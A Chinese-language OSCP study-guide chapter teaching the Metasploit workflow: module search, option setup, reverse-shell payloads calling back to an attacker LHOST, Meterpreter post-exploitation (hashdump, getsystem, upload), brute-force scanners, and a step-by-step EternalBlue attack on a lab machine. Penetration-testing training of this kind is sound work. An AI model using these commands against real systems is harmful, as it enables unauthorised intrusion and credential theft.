# Ch 16 — Metasploit 框架精通：search / use / exploit

> 目標：掌握 Metasploit 核心工作流，能快速找到模組、設定選項、執行 exploit，並理解 OSCP 的使用限制。

## OSCP 的 Metasploit 限制

**重要：OSCP 考試只允許使用一次 Metasploit 對一台機器。**

這代表：
- 不能對所有機器都用 Metasploit
- 把 Metasploit 留給最重要的目標（通常是最難的機器）
- 其他機器要用手動技術（Ch 17）

但在備考過程中，**用 Metasploit 理解漏洞原理**是有價值的——先用 Metasploit 打成功，再去看手動版，理解差異。

## 啟動 msfconsole

```bash
msfconsole
# 等一下初始化（第一次比較慢）

# 顯示版本
msf6 > version

# 退出
msf6 > exit
```

## 核心工作流

```
搜尋模組 → 選用模組 → 查看選項 → 設定選項 → 執行
search   →  use      →  show options/info → set/setg → run/exploit
```

### 搜尋模組

```bash
# 搜服務名 + 關鍵字
msf6 > search vsftpd
msf6 > search ms17-010
msf6 > search samba type:exploit

# 搜 CVE
msf6 > search cve:2017-0144

# 搜 payload 類型
msf6 > search platform:linux type:exploit rank:excellent
```

輸出欄位說明：
```
#  Name                    Disclosure Date  Rank       Description
-  ----                    ---------------  ----       -----------
0  exploit/multi/samba/... 2007-05-14       excellent  Samba "username map script" Command Execution

Rank: manual < low < average < normal < good < great < excellent
推薦用 excellent 和 great，低 rank 的 exploit 穩定性差。
```

### 使用模組

```bash
msf6 > use exploit/multi/samba/usermap_script
# 或用搜尋結果的編號
msf6 > use 0

# 查看詳細說明
msf6 exploit(multi/samba/usermap_script) > info

# 查看必填選項
msf6 exploit(multi/samba/usermap_script) > show options
```

### 設定選項

```bash
# Required 選項一定要填
set RHOSTS 10.10.10.3      # 目標 IP
set RPORT 445              # 目標 port（通常有預設值）
set LHOST 10.10.14.5       # 你的 tun0 IP（反彈 shell 用）
set LPORT 4444             # 你的監聽 port

# 確認設定
show options

# 全局設定（對所有模組生效）
setg LHOST 10.10.14.5      # 一次設好，不用每次重設
```

### 選擇 Payload

```bash
# 查看可用 payload
show payloads

# 常用 payload
set PAYLOAD linux/x86/shell_reverse_tcp      # Linux 32bit 反彈 shell
set PAYLOAD linux/x64/shell_reverse_tcp      # Linux 64bit 反彈 shell
set PAYLOAD cmd/unix/reverse_bash            # 純 bash 反彈
set PAYLOAD windows/x64/meterpreter/reverse_tcp  # Windows Meterpreter
```

### 執行

```bash
run
# 或
exploit

# 加 -j 在背景執行
exploit -j

# 查看背景 session
sessions
sessions -l    # 列出
sessions -i 1  # 進入 session 1
```

## Meterpreter

Meterpreter 是 Metasploit 的進階 payload，比普通 shell 功能多：

```bash
meterpreter > help        # 所有指令
meterpreter > sysinfo     # 系統資訊
meterpreter > getuid      # 當前使用者
meterpreter > getpid      # 當前程序 ID
meterpreter > ps          # 程序列表
meterpreter > shell       # 進入 OS shell

# 檔案操作
meterpreter > upload /local/file /remote/path
meterpreter > download /remote/file
meterpreter > ls
meterpreter > cd /tmp

# 提權（Windows）
meterpreter > getsystem      # 嘗試自動提權

# 橫向移動
meterpreter > hashdump        # 提取密碼 hash（需要 SYSTEM）
meterpreter > run post/multi/recon/local_exploit_suggester  # 找提權漏洞
```

## 常用模組清單

### 漏洞利用

```
exploit/multi/samba/usermap_script    → Samba 3.0.20（Lame）
exploit/windows/smb/ms17_010_eternalblue → MS17-010（Blue）
exploit/windows/smb/ms08_067_netapi  → MS08-067（Legacy）
exploit/multi/http/tomcat_mgr_upload  → Tomcat WAR 上傳
exploit/unix/ftp/vsftpd_234_backdoor  → vsftpd 2.3.4
```

### 輔助（Auxiliary）

```
auxiliary/scanner/smb/smb_ms17_010   → 掃描 MS17-010
auxiliary/scanner/ftp/ftp_login      → FTP 暴力破解
auxiliary/scanner/http/dir_scanner   → 目錄掃描
auxiliary/scanner/ssh/ssh_login      → SSH 暴力破解
auxiliary/scanner/snmp/snmp_enum     → SNMP 枚舉
```

### Post（後滲透）

```
post/multi/recon/local_exploit_suggester  → 找提權漏洞
post/windows/gather/hashdump              → 提取密碼
post/linux/gather/enum_configs            → 收集設定檔
```

## 實戰範例：打 MS17-010

```bash
msfconsole

# 先掃描確認漏洞
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 > set RHOSTS 10.10.10.40
msf6 > run

# 確認有漏洞後，切換 exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS 10.10.10.40
msf6 > set LHOST 10.10.14.5
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > exploit

# 拿到 Meterpreter 後
meterpreter > getuid        # 確認是 SYSTEM
meterpreter > shell         # 進 cmd
C:\> type C:\Users\Administrator\Desktop\proof.txt
```

## Metasploit 的資料庫整合

```bash
# 啟動 PostgreSQL 資料庫（存掃描結果）
sudo service postgresql start
msfconsole

msf6 > db_status
# Connected to msf. Connection type: postgresql.

# 匯入 nmap 掃描結果
msf6 > db_import /path/to/nmap.xml

# 查看主機
msf6 > hosts
msf6 > services
```

## 自我檢核

- [ ] 能用 `search` 找到模組，並用 `info` 看說明
- [ ] 能正確設定 RHOSTS / LHOST / PAYLOAD 並執行
- [ ] 知道 OSCP 考試 Metasploit 只能用一次
- [ ] 能在 Meterpreter 中做基本的後滲透操作（hashdump, shell, upload）

→ [Ch 17 手動漏洞利用：修改 Python/C exploit 腳本](./17-manual-exploitation.md)
